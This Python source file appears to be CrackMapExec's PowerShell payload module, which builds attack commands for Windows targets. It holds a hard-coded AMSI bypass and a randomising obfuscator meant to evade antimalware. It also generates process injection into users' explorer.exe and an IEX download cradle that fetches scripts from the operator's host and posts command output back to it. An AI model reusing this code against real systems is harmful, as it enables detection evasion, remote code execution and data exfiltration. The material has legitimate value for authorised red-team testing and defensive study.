import os
import re
from sys import exit
from string import ascii_lowercase
from random import choice, sample
from subprocess import call
from cme.helpers.misc import which
from cme.logger import cme_logger
from cme.paths import CME_PATH, DATA_PATH
from base64 import b64encode
obfuscate_ps_scripts = False
def get_ps_script(path):
    return os.path.join(DATA_PATH, path)
def encode_ps_command(command):
    return b64encode(command.encode("UTF-16LE")).decode()
def is_powershell_installed():
    if which("powershell"):
        return True
    return False
def obfs_ps_script(path_to_script):
    ps_script = path_to_script.split("/")[-1]
    obfs_script_dir = os.path.join(CME_PATH, "obfuscated_scripts")
    obfs_ps_script = os.path.join(obfs_script_dir, ps_script)
    if is_powershell_installed() and obfuscate_ps_scripts:
        if os.path.exists(obfs_ps_script):
            cme_logger.display("Using cached obfuscated Powershell script")
            with open(obfs_ps_script, "r") as script:
                return script.read()
        cme_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
        invoke_obfs_command = f"powershell -C 'Import-Module {get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \"TOKEN,ALL,1,OUT {obfs_ps_script}\" -Quiet'"
        cme_logger.debug(invoke_obfs_command)
        with open(os.devnull, "w") as devnull:
            return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
        cme_logger.success("Script obfuscated successfully")
        with open(obfs_ps_script, "r") as script:
            return script.read()
    else:
        with open(get_ps_script(path_to_script), "r") as script:
            """
            Strip block comments, line comments, empty lines, verbose statements,
            and debug statements from a PowerShell source file.
            """
            stripped_code = re.sub(re.compile("<#.*?#>", re.DOTALL), "", script.read())
            stripped_code = "\n".join([line for line in stripped_code.split("\n") if ((line.strip() != "") and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))])
            return stripped_code
def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):
    if custom_amsi:
        with open(custom_amsi) as file_in:
            lines = []
            for line in file_in:
                lines.append(line)
            amsi_bypass = "".join(lines)
    else:
        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try{
[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
}catch{}
"""
    if force_ps32:
        command = (
            amsi_bypass
            + """
$functions = {{
    function Command-ToExecute
    {{
{command}
    }}
}}
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
{{
    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32
    $job | Wait-Job
}}
else
{{
    IEX "$functions"
    Command-ToExecute
}}
""".format(
                command=amsi_bypass + ps_command
            )
        )
    else:
        command = amsi_bypass + ps_command
    cme_logger.debug("Generated PS command:\n {}\n".format(command))
    """
    if is_powershell_installed():
        temp = tempfile.NamedTemporaryFile(prefix='cme_',
                                           suffix='.ps1',
                                           dir='/tmp')
        temp.write(command)
        temp.read()
        encoding_types = [1,2,3,4,5,6]
        while True:
            encoding = random.choice(encoding_types)
            invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                              temp.name,
                                                                                                                                              encoding)
            cme_logger.debug(invoke_obfs_command)
            out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
            cme_logger.debug('Command length: {}'.format(len(command)))
            if len(command) <= 8192:
                temp.close()
                break
            encoding_types.remove(encoding)
    else:
    """
    if not dont_obfs:
        obfs_attempts = 0
        while True:
            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{invoke_obfuscation(command)}"'
            if len(command) <= 8191:
                break
            if obfs_attempts == 4:
                cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                exit(1)
            obfs_attempts += 1
    else:
        command = f"powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}"
        if len(command) > 8191:
            cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
            exit(1)
    return command
def gen_ps_inject(command, context=None, procname="explorer.exe", inject_once=False):
    ps_code = """
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
""".format(
        inject_once="$True" if inject_once else "$False",
        command=encode_ps_command(command),
        procname=procname,
    )
    if context:
        return gen_ps_iex_cradle(context, "Invoke-PSInject.ps1", ps_code, post_back=False)
    return ps_code
def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):
    if type(scripts) is str:
        launcher = """
[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}')
{command}
""".format(
            server=context.server,
            port=context.server_port,
            addr=context.localip,
            ps_script_name=scripts,
            command=command if post_back is False else "",
        ).strip()
    elif type(scripts) is list:
        launcher = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
        launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
        for script in scripts:
            launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(
                server=context.server,
                port=context.server_port,
                addr=context.localip,
                script=script,
            )
        launcher.strip()
        launcher += command if post_back is False else ""
    if post_back is True:
        launcher += """
$cmd = {command}
$request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/')
$request.Method = 'POST'
$request.ContentType = 'application/x-www-form-urlencoded'
$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
$request.ContentLength = $bytes.Length
$requestStream = $request.GetRequestStream()
$requestStream.Write($bytes, 0, $bytes.Length)
$requestStream.Close()
$request.GetResponse()""".format(
            server=context.server,
            port=context.server_port,
            addr=context.localip,
            command=command,
        )
    cme_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
    return launcher.strip()
def invoke_obfuscation(script_string):
    alphabet = "".join(choice([i.upper(), i]) for i in ascii_lowercase)
    random_delimiters = [
        "_",
        "-",
        ",",
        "{",
        "}",
        "~",
        "!",
        "@",
        "%",
        "&",
        "<",
        ">",
        ";",
        ":",
    ]
    for i in alphabet:
        random_delimiters.append(i)
    random_delimiters = [choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))]
    delimited_encoded_array = ""
    for char in script_string:
        delimited_encoded_array += str(ord(char)) + choice(random_delimiters)
    delimited_encoded_array = delimited_encoded_array[:-1]
    test = sample(random_delimiters, len(random_delimiters))
    random_delimiters_to_print = "".join(i for i in test)
    for_each_object = choice(["ForEach", "ForEach-Object", "%"])
    str_join = "".join(choice([i.upper(), i.lower()]) for i in "[String]::Join")
    str_str = "".join(choice([i.upper(), i.lower()]) for i in "[String]")
    join = "".join(choice([i.upper(), i.lower()]) for i in "-Join")
    char_str = "".join(choice([i.upper(), i.lower()]) for i in "Char")
    integer = "".join(choice([i.upper(), i.lower()]) for i in "Int")
    for_each_object = "".join(choice([i.upper(), i.lower()]) for i in for_each_object)
    random_delimiters_to_print_for_dash_split = ""
    for delim in random_delimiters:
        split = "".join(choice([i.upper(), i.lower()]) for i in "Split")
        random_delimiters_to_print_for_dash_split += "-" + split + choice(["", " "]) + "'" + delim + "'" + choice(["", " "])
    random_delimiters_to_print_for_dash_split = random_delimiters_to_print_for_dash_split.strip("\t\n\r")
    random_conversion_syntax = [
        "[" + char_str + "]" + choice(["", " "]) + "[" + integer + "]" + choice(["", " "]) + "$_",
        "[" + integer + "]" + choice(["", " "]) + "$_" + choice(["", " "]) + choice(["-as", "-As", "-aS", "-AS"]) + choice(["", " "]) + "[" + char_str + "]",
    ]
    random_conversion_syntax = choice(random_conversion_syntax)
    encoded_array = ""
    for char in script_string:
        encoded_array += str(ord(char)) + choice(["", " "]) + "," + choice(["", " "])
    encoded_array = "(" + choice(["", " "]) + encoded_array.rstrip().rstrip(",") + ")"
    set_ofs_var_syntax = [
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "''",
        choice(["Set-Variable", "SV", "SET"]) + choice([" " * 1, " " * 2]) + "'OFS'" + choice([" " * 1, " " * 2]) + "''",
    ]
    set_ofs_var = choice(set_ofs_var_syntax)
    set_ofs_var_back_syntax = [
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
    ]
    set_ofs_var_back = choice(set_ofs_var_back_syntax)
    set_ofs_var = "".join(choice([i.upper(), i.lower()]) for i in set_ofs_var)
    set_ofs_var_back = "".join(choice([i.upper(), i.lower()]) for i in set_ofs_var_back)
    baseScriptArray = [
        "[" + char_str + "[]" + "]" + choice(["", " "]) + encoded_array,
        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'." + split + "(" + choice(["", " "]) + "'" + random_delimiters_to_print + "'" + choice(["", " "]) + ")" + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'" + choice(["", " "]) + random_delimiters_to_print_for_dash_split + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
        "(" + choice(["", " "]) + encoded_array + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
    ]
    new_script_array = [
        choice(baseScriptArray) + choice(["", " "]) + join + choice(["", " "]) + "''",
        join + choice(["", " "]) + choice(baseScriptArray),
        str_join + "(" + choice(["", " "]) + "''" + choice(["", " "]) + "," + choice(["", " "]) + choice(baseScriptArray) + choice(["", " "]) + ")",
        '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var + choice(["", " "]) + ")" + choice(["", " "]) + '"' + choice(["", " "]) + "+" + choice(["", " "]) + str_str + choice(baseScriptArray) + choice(["", " "]) + "+" + '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var_back + choice(["", " "]) + ")" + choice(["", " "]) + '"',
    ]
    newScript = choice(new_script_array)
    invoke_expression_syntax = [choice(["IEX", "Invoke-Expression"])]
    invocationOperator = choice([".", "&"]) + choice(["", " "])
    invoke_expression_syntax.append(invocationOperator + "( $ShellId[1]+$ShellId[13]+'x')")
    invoke_expression_syntax.append(invocationOperator + "( $PSHome[" + choice(["4", "21"]) + "]+$PSHOME[" + choice(["30", "34"]) + "]+'x')")
    invoke_expression_syntax.append(invocationOperator + "( $env:Public[13]+$env:Public[5]+'x')")
    invoke_expression_syntax.append(invocationOperator + "( $env:ComSpec[4," + choice(["15", "24", "26"]) + ",25]-Join'')")
    invoke_expression_syntax.append(invocationOperator + "((" + choice(["Get-Variable", "GV", "Variable"]) + " '*mdr*').Name[3,11,2]-Join'')")
    invoke_expression_syntax.append(invocationOperator + "( " + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"]) + "[1,3]+'x'-Join'')")
    invokeExpression = choice(invoke_expression_syntax)
    invokeExpression = "".join(choice([i.upper(), i.lower()]) for i in invokeExpression)
    invokeOptions = [
        choice(["", " "]) + invokeExpression + choice(["", " "]) + "(" + choice(["", " "]) + newScript + choice(["", " "]) + ")" + choice(["", " "]),
        choice(["", " "]) + newScript + choice(["", " "]) + "|" + choice(["", " "]) + invokeExpression,
    ]
    obfuscated_payload = choice(invokeOptions)
    """
    powerShellFlags = []
    noProfile = '-nop'
    nonInteractive = '-noni'
    windowStyle = '-w'
    commandlineOptions = []
    commandlineOptions.append(noProfile[0:randrange(4, len(noProfile) + 1, 1)])
    commandlineOptions.append(nonInteractive[0:randrange(5, len(nonInteractive) + 1, 1)])
    commandlineOptions.append(''.join(windowStyle[0:randrange(2, len(windowStyle) + 1, 1)] + choice([' '*1, ' '*2, ' '*3]) + choice(['1','h','hi','hid','hidd','hidde'])))
    for count, option in enumerate(commandlineOptions):
        commandlineOptions[count] = ''.join(choice([i.upper(), i.lower()]) for i in option)
    for count, option in enumerate(commandlineOptions):
        commandlineOptions[count] = ''.join(option)
    commandlineOptions = sample(commandlineOptions, len(commandlineOptions)) 
    commandlineOptions = ''.join(i + choice([' '*1, ' '*2, ' '*3]) for i in commandlineOptions)
    obfuscatedPayload = 'powershell.exe ' + commandlineOptions + newScript
    """
    return obfuscated_payload